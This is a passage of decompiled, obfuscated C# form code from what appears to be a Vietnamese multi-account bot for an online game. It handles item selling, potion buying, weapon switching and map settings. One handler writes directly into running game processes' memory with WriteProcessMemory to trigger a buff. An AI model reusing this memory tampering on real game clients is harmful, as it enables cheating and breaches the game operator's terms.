			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			try
			{
				if (!characterAccountConfig_1[i].bool_52 && !characterAccountConfig_1[i].bool_53)
				{
					characterAccountConfig_1[i].bool_53 = true;
					Class42.int_1 = characterAccountConfig_1[i].int_136;
					new Thread(Class42.smethod_4).Start();
					Thread.Sleep(150);
				}
			}
			catch
			{
			}
		}
	}

	private void comboBoxBanVatPham_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxBanVatPham.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < string_34.Length)
			{
				if (text == string_34[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].int_12[1] = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void checkBoxBanVpham_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_12[0] = Convert.ToByte(checkBoxBanVpham.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				buttonBanVatphamRac.Enabled = !checkBoxBanVpham.Checked;
			}
		}
	}

	private void buttonDsBanVatpham_Click(object sender, EventArgs e)
	{
		if (FormBanEvent.bool_1)
		{
			FormBanEvent.bool_1 = false;
			return;
		}
		try
		{
			FormBanEvent formBanEvent = new FormBanEvent();
			formBanEvent.int_2 = Cursor.Position.X;
			formBanEvent.int_3 = Cursor.Position.Y;
			formBanEvent.int_4 = base.Width;
			formBanEvent.int_5 = base.Height;
			formBanEvent.Show();
		}
		catch
		{
		}
	}

	private void buttonOpenAllWeb_Click(object sender, EventArgs e)
	{
		string text = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(text))
		{
			text = Class66.smethod_0();
		}
		int num = Class11.smethod_11(textBoxDelta.Text);
		int num2 = Class11.smethod_11(textBoxStart.Text);
		textBoxStart.Text = (num2 + num).ToString();
		while (string_7.GetLength(0) > num2)
		{
			string text2 = string_7[num2, 0];
			if (!(text2 == "khác"))
			{
				string[] array = text2.Split('+', ' ', ',');
				for (int i = 0; i < array.Length; i++)
				{
					text2 = array[i];
					if (text2 == string.Empty || text2 == null)
					{
						continue;
					}
					text2 = text2.Trim();
					if (text2.Length >= 6)
					{
						if (Class11.smethod_1(text2, "://") < 0)
						{
							text2 = "http://" + text2;
						}
						Class24.smethod_40(text, "", text2, 0);
					}
				}
			}
			num2++;
			num--;
			if (num2 >= string_7.GetLength(0) || num <= 0)
			{
				break;
			}
		}
	}

	private void comboBoxTrinhsat_MouseDown(object sender, MouseEventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		string text = comboBoxTrinhsat.Text;
		string text2 = string.Empty;
		comboBoxTrinhsat.Items.Clear();
		comboBoxTrinhsat.Items.Add(string.Empty);
		string_59 = null;
		Class3.smethod_25(characterAccountConfig_1[num], ref string_59, 3);
		if (string_59 != null)
		{
			for (int i = 0; i < string_59.Length; i++)
			{
				string text3 = Class1.smethod_1(string_59[i], 1);
				if (text3 == text)
				{
					text2 = text3;
				}
				comboBoxTrinhsat.Items.Add(text3);
			}
			if (text2 == string.Empty)
			{
				text2 = Class1.smethod_1(string_59[0], 1);
			}
		}
		if (text2 != string.Empty)
		{
			comboBoxTrinhsat.Text = text2;
		}
		Thread.Sleep(3);
		bool_23 = true;
	}

	private void comboBoxTrinhsat_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_59 == null)
		{
			return;
		}
		string text = comboBoxTrinhsat.Text;
		if (text != null && !(text == string.Empty))
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num < 0)
			{
				return;
			}
			bool flag = false;
			for (int i = 0; i < string_59.Length; i++)
			{
				if (text == Class1.smethod_1(string_59[i], 1))
				{
					Class59.string_0 = string_59[i];
					flag = true;
					break;
				}
			}
			if (flag)
			{
				int num2 = Class3.smethod_13(characterAccountConfig_1[num], Class59.string_0, 3);
				Class59.uint_2 = Class3.smethod_19(characterAccountConfig_1[num], num2);
				if (Class59.uint_2 != null && (Class59.uint_2[0] == 0 || Class59.uint_2[1] == 0))
				{
					Class59.uint_2 = null;
				}
				if (Class59.uint_2 != null)
				{
					labelToadoTrinhsat.Text = "Tọa độ: " + Class59.uint_2[0] / 256 + "," + Class59.uint_2[1] / 512;
				}
				else
				{
					labelToadoTrinhsat.Text = "{ ... mặc định }";
					Class59.string_0 = null;
					comboBoxTrinhsat.Items.Clear();
				}
			}
		}
		else
		{
			Class59.string_0 = null;
			labelToadoTrinhsat.Text = "{ ... mặc định }";
		}
	}

	private void checkBoxBaoKeylog_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_74 = Convert.ToByte(checkBoxBaoKeylog.Checked);
			FormAntivirus.bool_1 = false;
			Class66.smethod_11(Class66.smethod_1(), "BaoKeylog", int_74, "", 0);
		}
	}

	private void checkBoxDenToadoLeave_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_82 = Convert.ToByte(checkBoxDenToadoLeave.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fDenToadoLeave", int_82, "", 0);
		}
	}

	private void checkBoxTHPChienLong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_116 = Convert.ToByte(checkBoxTHPChienLong.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagThpCLD", int_116, "", 0);
		}
	}

	private void comboBoxCTC_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_28 = 0;
		for (int i = 0; i < string_17.Length; i++)
		{
			if (comboBoxCTC.Text == string_17[i])
			{
				int_28 = i;
				break;
			}
		}
		method_1();
	}

	private void buttonLayMapTamMondai_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			FormTip.smethod_0(string_49, "Hãy chọn 1 ac đang đứng trong Tam môn đài rồi lấy map id.", 60000, 250, 100);
			return;
		}
		int num2 = Class39.smethod_0(characterAccountConfig_1[num]);
		if (num2 > 0)
		{
			int_30 = num2;
			Class66.smethod_11(Class66.smethod_1(), "TamMonDaiMapID", int_30, "", 0);
			textBoxTamMonDaiMapId.Text = int_30.ToString();
		}
	}

	private void buttonMapTamMondaiMacdinh_Click(object sender, EventArgs e)
	{
		int_30 = 221;
		textBoxTamMonDaiMapId.Text = int_30.ToString();
		Class66.smethod_11(Class66.smethod_1(), "TamMonDaiMapID", int_30, "", 0);
	}

	private void buttonResetAuto_Click(object sender, EventArgs e)
	{
		string text = "Sau khi reset cấu hình auto, bạn phải thiết lập lại các thông số cho ac (như chiêu thức, mua máu, ...)." + Class56.string_7 + Class56.string_7 + "Tuy có vẻ hơi mất công và cực nhọc, nhưng điều này sẽ giúp sửa các lỗi thiết lập cấu hình (mà bạn lỡ out ac A log ac B trên cùng 1 game) trước đây, làm cho auto và game nhanh nhẹ hơn." + Class56.string_7 + Class56.string_7 + "Vậy bạn có chắc chắn muốn reset ?";
		if (MessageBox.Show(text, string_49, MessageBoxButtons.YesNo) != DialogResult.No)
		{
			new Thread(method_32).Start();
		}
	}

	private void method_32()
	{
		try
		{
			method_34();
			method_33();
		}
		catch
		{
		}
		TryNewVersion.int_0 = 2;
		string_26 = null;
		int_136 = 0;
	}

	private void method_33()
	{
		string[] array = new string[2]
		{
			Class11.smethod_0(Class11.char_31).ToLower(),
			Class11.smethod_0(Class11.char_32).ToLower()
		};
		string[] files = Directory.GetFiles(Class56.string_9, "*.*", SearchOption.AllDirectories);
		if (files == null || files.Length == 0)
		{
			return;
		}
		for (int i = 0; i < files.Length; i++)
		{
			if (files[i] == null || files[i] == string.Empty)
			{
				continue;
			}
			string[] array2 = files[i].Split('\\');
			string text = array2[array2.Length - 1];
			if (text == null || text == string.Empty)
			{
				continue;
			}
			text = text.ToLower();
			for (int j = 0; j < array.Length; j++)
			{
				if (text == array[j])
				{
					text = null;
					break;
				}
			}
			if (text != null)
			{
				Class11.smethod_20(files[i]);
			}
		}
	}

	private void method_34()
	{
		string[] array = new string[3] { "PathGame", "textIDSudung", "TenWeb" };
		for (int i = 0; i < 2; i++)
		{
			string[] array2 = Class66.smethod_10(Class66.smethod_1(), i > 0);
			if (array2 == null)
			{
				continue;
			}
			for (int j = 0; j < array2.Length; j++)
			{
				bool flag = false;
				for (int k = 0; k < array.Length; k++)
				{
					if (array[k].ToLower() == array2[j].ToLower())
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					Class66.smethod_13(Class66.smethod_1(), array2[j], (byte)i);
				}
			}
		}
	}

	private void buttonTamMonDaiHD_Click(object sender, EventArgs e)
	{
		string text = "https://youtu.be/fWjrqZWKKDQ";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		text = "Dán vào trình duyệt link sau nếu không xem được:" + text;
		FormTip.smethod_0(string_49, text, 60000, 250, 100);
	}

	private void checkBoxMuaMauFree_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_78 = Convert.ToByte(checkBoxMuaMauFree.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void checkBoxChuyenChinhxac_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_102 = Convert.ToByte(checkBoxChuyenChinhxac.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fChuyenThuocChinhxacTen", int_102, "", 0);
		}
	}

	private void checkBoxVeThanhCt_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_103 = Convert.ToByte(checkBoxVeThanhCt.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fChuyenThuocTruocMua", int_103, "", 0);
		}
	}

	private void checkBoxVukhi0_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct47_0[0].int_0 = Convert.ToByte(checkBoxVukhi0.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxVukhi1_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct47_0[1].int_0 = Convert.ToByte(checkBoxVukhi1.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxVukhiKieu0_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxVukhiKieu0.Text;
		for (int i = 0; i < string_41.Length; i++)
		{
			if (text == string_41[i])
			{
				characterAccountConfig_1[num].gstruct47_0[0].int_1 = i;
				Class56.smethod_13(characterAccountConfig_1[num]);
				break;
			}
		}
	}

	private void comboBoxVukhiKieu1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxVukhiKieu1.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < string_41.Length)
			{
				if (text == string_41[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].gstruct47_0[1].int_1 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void textBoxVukhi0_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct47_0[0].int_2 = Class11.smethod_11(textBoxVukhi0.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxVukhi1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct47_0[1].int_2 = Class11.smethod_11(textBoxVukhi1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxVukhi0_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || characterAccountConfig_1 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		comboBoxVukhi0.Items.Clear();
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		int[] object_ = new int[3] { 1, 2, 3 };
		int[] array = new int[1];
		gstruct59_0 = Class85.smethod_39(characterAccountConfig, object_, array, bool_3: true);
		if (gstruct59_0 != null)
		{
			for (int i = 0; i < gstruct59_0.Length; i++)
			{
				comboBoxVukhi0.Items.Add(Class1.smethod_1(gstruct59_0[i].string_0, 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxVukhi1_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || characterAccountConfig_1 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		comboBoxVukhi1.Items.Clear();
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		int[] object_ = new int[3] { 1, 2, 3 };
		int[] array = new int[1];
		gstruct59_0 = Class85.smethod_39(characterAccountConfig, object_, array, bool_3: true);
		if (gstruct59_0 != null)
		{
			for (int i = 0; i < gstruct59_0.Length; i++)
			{
				comboBoxVukhi1.Items.Add(Class1.smethod_1(gstruct59_0[i].string_0, 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxVukhi0_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || gstruct59_0 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxVukhi0.Text;
		for (int i = 0; i < gstruct59_0.Length; i++)
		{
			if (!(text == Class1.smethod_1(gstruct59_0[i].string_0, 1)))
			{
				continue;
			}
			characterAccountConfig_1[num].gstruct47_0[0].string_0 = gstruct59_0[i].string_0;
			characterAccountConfig_1[num].gstruct47_0[0].int_5 = null;
			if (gstruct59_0[i].int_0 != null)
			{
				characterAccountConfig_1[num].gstruct47_0[0].int_5 = new int[gstruct59_0[i].int_0.Length];
				for (int j = 0; j < gstruct59_0[i].int_0.Length; j++)
				{
					characterAccountConfig_1[num].gstruct47_0[0].int_5[j] = gstruct59_0[i].int_0[j];
				}
			}
			Class56.smethod_13(characterAccountConfig_1[num]);
			break;
		}
	}

	private void comboBoxVukhi1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || gstruct59_0 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxVukhi1.Text;
		for (int i = 0; i < gstruct59_0.Length; i++)
		{
			if (!(text == Class1.smethod_1(gstruct59_0[i].string_0, 1)))
			{
				continue;
			}
			characterAccountConfig_1[num].gstruct47_0[1].string_0 = gstruct59_0[i].string_0;
			characterAccountConfig_1[num].gstruct47_0[1].int_5 = null;
			if (gstruct59_0[i].int_0 != null)
			{
				characterAccountConfig_1[num].gstruct47_0[1].int_5 = new int[gstruct59_0[i].int_0.Length];
				for (int j = 0; j < gstruct59_0[i].int_0.Length; j++)
				{
					characterAccountConfig_1[num].gstruct47_0[1].int_5[j] = gstruct59_0[i].int_0[j];
				}
			}
			Class56.smethod_13(characterAccountConfig_1[num]);
			break;
		}
	}

	private void textBoxLocTocdo_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxLocTocdo.Text);
			if (num2 < 0 || num2 > 15000)
			{
				num2 = 100;
			}
			Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_11, num2, 4);
			characterAccountConfig_1[num].int_11 = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void buttonTatcaMuamau_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		Class59.int_0 = 1;
		Class59.long_0 = Class11.smethod_27();
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_22, 1, 4);
			}
		}
	}

	private void buttonStopMuamau_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 != null)
		{
			Class59.int_0 = 2;
			Class59.long_0 = Class11.smethod_27();
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_22, 0, 4);
			}
		}
	}

	private void buttonCongHauDoanh_Click(object sender, EventArgs e)
	{
		if (FormChayMuaMauTK.bool_0)
		{
			FormChayMuaMauTK.bool_0 = false;
			return;
		}
		try
		{
			FormChayMuaMauTK.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormChayMuaMauTK.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormChayMuaMauTK formChayMuaMauTK = new FormChayMuaMauTK();
			formChayMuaMauTK.Show();
		}
		catch
		{
		}
	}

	private void buttonStopSudung_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].bool_51 = false;
			characterAccountConfig_1[num].bool_53 = false;
		}
	}

	private void buttonStopSudungAll_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				characterAccountConfig_1[i].bool_51 = false;
				characterAccountConfig_1[i].bool_53 = false;
			}
		}
	}

	private void buttonBatdauMua_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0 && !characterAccountConfig_1[num].bool_47 && !characterAccountConfig_1[num].bool_51)
		{
			characterAccountConfig_1[num].bool_51 = true;
			Class42.int_0 = characterAccountConfig_1[num].int_136;
			new Thread(Class42.smethod_2).Start();
		}
	}

	private void buttonBatdauSudung_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0 && !characterAccountConfig_1[num].bool_52 && !characterAccountConfig_1[num].bool_53)
		{
			characterAccountConfig_1[num].bool_53 = true;
			Class42.int_1 = characterAccountConfig_1[num].int_136;
			new Thread(Class42.smethod_4).Start();
		}
	}

	private void checkBoxCaudame_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_130[0] = Convert.ToByte(checkBoxCaudame.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxCaudame_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_130[1] = Class11.smethod_11(textBoxCaudame.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxKieudiCLD_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		string text = comboBoxKieudiCLD.Text;
		for (int i = 0; i < string_38.Length; i++)
		{
			if (text == string_38[i])
			{
				int_117 = i;
				Class66.smethod_11(Class66.smethod_1(), "flagKieuDiCLD", int_117, "", 0);
				break;
			}
		}
	}

	private void buttonBanVatphamRac_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			FormBanEvent.int_0 = characterAccountConfig_1[num].int_136;
			FormBanEvent.smethod_3();
		}
	}

	private void buttonTatCaBanVatPhamRac_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		buttonTatCaBanVatPhamRac.Enabled = false;
		try
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				for (int j = 0; j < 100; j++)
				{
					if (FormBanEvent.int_0 <= 0)
					{
						break;
					}
					Thread.Sleep(30);
				}
				if (characterAccountConfig_1[i].bool_25)
				{
					FormBanEvent.int_0 = characterAccountConfig_1[i].int_136;
					new Thread(FormBanEvent.smethod_3).Start();
				}
			}
		}
		catch
		{
		}
		Thread.Sleep(100);
		buttonTatCaBanVatPhamRac.Enabled = true;
	}

	private void buttonTangdiem_Click(object sender, EventArgs e)
	{
		if (FormTangdiem.bool_0)
		{
			FormTangdiem.bool_0 = false;
			return;
		}
		try
		{
			FormTangdiem formTangdiem = new FormTangdiem();
			formTangdiem.int_0 = base.Left;
			formTangdiem.int_1 = base.Top;
			formTangdiem.int_2 = base.Width;
			formTangdiem.int_3 = base.Height;
			formTangdiem.Show();
		}
		catch
		{
		}
	}

	private void buttonBuffLaiTranphai_Click(object sender, EventArgs e)
	{
		int num = 0;
		byte[] byte_ = new byte[1] { 1 };
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				Class24.WriteProcessMemory(characterAccountConfig_1[i].int_137, characterAccountConfig_1[i].uint_16 + Class75.uint_41 * 4, byte_, 1, ref num);
			}
		}
	}

	private void checkBoxTatBuffTamthoi_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			bool_22 = checkBoxTatBuffTamthoi.Checked;
		}
	}

	private void checkBoxTTDT_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_84[1] = Convert.ToByte(checkBoxTTDT.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonMenuLocClick_Click(object sender, EventArgs e)
	{
		if (FormMenuClick.bool_0)
		{
			FormMenuClick.bool_0 = false;
			return;
		}
		try
		{
			FormMenuClick.string_0 = FormLocdoTest.string_1;
			FormMenuClick.int_2 = FormLocdoTest.int_13;
			FormMenuClick formMenuClick = new FormMenuClick();
			formMenuClick.int_0 = Cursor.Position.X;
			formMenuClick.int_1 = Cursor.Position.Y;
			formMenuClick.Show();
		}
		catch
		{
			FormMenuClick.string_0 = null;
			FormMenuClick.bool_1 = false;
			FormMenuClick.bool_0 = false;
		}
	}

	private void buttonNpcClickMenu_Click(object sender, EventArgs e)
	{
		if (FormMenuClick.bool_0)
		{
			FormMenuClick.bool_0 = false;
			return;
		}
		try
		{
			if (timer_3.Enabled && bool_23)
			{
				int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
				if (num >= 0)
				{
					FormMenuClick.string_0 = "PID:" + characterAccountConfig_1[num].int_136;
					FormMenuClick.int_2 = characterAccountConfig_1[num].int_9;
					FormMenuClick formMenuClick = new FormMenuClick();
					formMenuClick.int_0 = Cursor.Position.X;
					formMenuClick.int_1 = Cursor.Position.Y;
					formMenuClick.Show();
				}
			}
		}
		catch
		{
			FormMenuClick.string_0 = null;
			FormMenuClick.bool_1 = false;
			FormMenuClick.bool_0 = false;
		}
	}

	private void checkBoxChuyenTrai1_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[0].int_0 = Convert.ToByte(checkBoxChuyenTrai1.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenTrai1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[0].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenTrai1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxKieu1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = 0;
		while (true)
		{
			if (num2 < string_41.Length)
			{
				if (comboBoxKieu1.Text == string_41[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].gstruct48_0[0].int_3 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void textBoxChuyenTrai1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[0].int_2 = Class11.smethod_11(textBoxChuyenTrai1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChuyenTrai2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[1].int_0 = Convert.ToByte(checkBoxChuyenTrai2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenTrai2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[1].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenTrai2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxKieu2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = 0;
		while (true)
		{
			if (num2 < string_41.Length)
			{
				if (comboBoxKieu2.Text == string_41[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].gstruct48_0[1].int_3 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void textBoxChuyenTrai2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[1].int_2 = Class11.smethod_11(textBoxChuyenTrai2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxChuyenTrai3_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[2].int_0 = Convert.ToByte(checkBoxChuyenTrai3.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenTrai3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct48_0[2].int_1 = Class83.smethod_12(characterAccountConfig_1[num].gstruct58_0, comboBoxChuyenTrai3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxKieu3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = 0;
		while (true)
		{
			if (num2 < string_41.Length)
			{
				if (comboBoxKieu3.Text == string_41[num2])
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].gstruct48_0[2].int_3 = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void textBoxChuyenTrai3_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
